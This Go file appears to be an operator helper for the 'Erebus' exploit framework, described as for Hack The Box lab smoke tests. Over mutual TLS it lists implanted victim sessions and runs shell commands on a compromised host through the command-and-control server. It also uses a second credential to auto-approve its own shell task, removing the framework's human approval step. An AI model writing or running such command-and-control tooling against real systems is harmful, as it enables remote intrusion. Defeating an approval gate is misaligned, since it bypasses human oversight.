//go:build ignore

// One-shot operator helper for HTB lab smoke tests.
package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"flag"
	"fmt"
	"os"
	"time"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/protobuf/proto"
)

func main() {
	server := flag.String("server", "127.0.0.1:50051", "gRPC")
	opCert := flag.String("op-cert", "", "")
	opKey := flag.String("op-key", "", "")
	apCert := flag.String("ap-cert", "", "")
	apKey := flag.String("ap-key", "", "")
	ca := flag.String("ca", "", "")
	cmd := flag.String("cmd", "sessions", "sessions|shell")
	session := flag.String("session", "", "session id for shell")
	shell := flag.String("shell", "id; hostname; uname -a; ip -br a", "shell command")
	flag.Parse()

	op := mustDial(*server, *opCert, *opKey, *ca)
	defer op.Close()
	opC := pb.NewErebusC2Client(op)

	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()

	switch *cmd {
	case "sessions":
		resp, err := opC.ListSessions(ctx, &pb.ListSessionsRequest{})
		if err != nil {
			fatal(err)
		}
		for _, s := range resp.Sessions {
			fmt.Printf("session=%s implant=%s host=%s user=%s os=%s alive=%v last=%d\n",
				s.SessionId, s.ImplantId, s.Hostname, s.Username, s.Os, s.Alive, s.LastCheckin)
		}
	case "shell":
		if *session == "" {
			// pick first alive
			resp, err := opC.ListSessions(ctx, &pb.ListSessionsRequest{})
			if err != nil {
				fatal(err)
			}
			for _, s := range resp.Sessions {
				if s.Alive {
					*session = s.SessionId
					break
				}
			}
			if *session == "" {
				fatal(fmt.Errorf("no alive session"))
			}
			fmt.Println("using session", *session)
		}
		ap := mustDial(*server, *apCert, *apKey, *ca)
		defer ap.Close()
		apC := pb.NewErebusC2Client(ap)

		data, _ := proto.Marshal(&pb.ShellTask{Command: *shell})
		type result struct {
			resp *pb.ExecuteTaskResponse
			err  error
		}
		done := make(chan result, 1)
		go func() {
			r, err := opC.ExecuteTask(ctx, &pb.ExecuteTaskRequest{
				SessionId: *session,
				TaskType:  pb.TaskType_TASK_SHELL,
				Data:      data,
				Wait:      true,
				TimeoutMs: 45000,
			})
			done <- result{r, err}
		}()

		var approvalID string
		deadline := time.Now().Add(20 * time.Second)
		for time.Now().Before(deadline) {
			pending, err := apC.ListPendingApprovals(ctx, &pb.ListPendingApprovalsRequest{})
			if err != nil {
				fatal(err)
			}
			for _, a := range pending.Approvals {
				if a.SessionId == *session && a.TaskType == pb.TaskType_TASK_SHELL {
					approvalID = a.Id
					break
				}
			}
			if approvalID != "" {
				break
			}
			time.Sleep(100 * time.Millisecond)
		}
		if approvalID == "" {
			fatal(fmt.Errorf("no pending shell approval"))
		}
		if _, err := apC.Approve(ctx, &pb.ApproveRequest{ApprovalId: approvalID}); err != nil {
			fatal(err)
		}
		fmt.Println("approved", approvalID)

		select {
		case r := <-done:
			if r.err != nil {
				fatal(r.err)
			}
			if r.resp.Result == nil {
				fatal(fmt.Errorf("nil result"))
			}
			sr := &pb.ShellResult{}
			_ = proto.Unmarshal(r.resp.Result.Data, sr)
			fmt.Printf("success=%v exit=%d\n--- stdout ---\n%s\n--- stderr ---\n%s\n",
				r.resp.Result.Success, sr.ExitCode, sr.Stdout, sr.Stderr)
		case <-ctx.Done():
			fatal(ctx.Err())
		}
	default:
		fatal(fmt.Errorf("unknown cmd %s", *cmd))
	}
}

func mustDial(addr, cert, key, caPath string) *grpc.ClientConn {
	certPair, err := tls.LoadX509KeyPair(cert, key)
	if err != nil {
		fatal(err)
	}
	pem, err := os.ReadFile(caPath)
	if err != nil {
		fatal(err)
	}
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(pem) {
		fatal(fmt.Errorf("bad ca"))
	}
	tlsCfg := &tls.Config{
		Certificates: []tls.Certificate{certPair},
		RootCAs:      pool,
		MinVersion:   tls.VersionTLS12,
	}
	conn, err := grpc.NewClient(addr, grpc.WithTransportCredentials(credentials.NewTLS(tlsCfg)))
	if err != nil {
		fatal(err)
	}
	return conn
}

func fatal(err error) {
	fmt.Fprintln(os.Stderr, "error:", err)
	os.Exit(1)
}
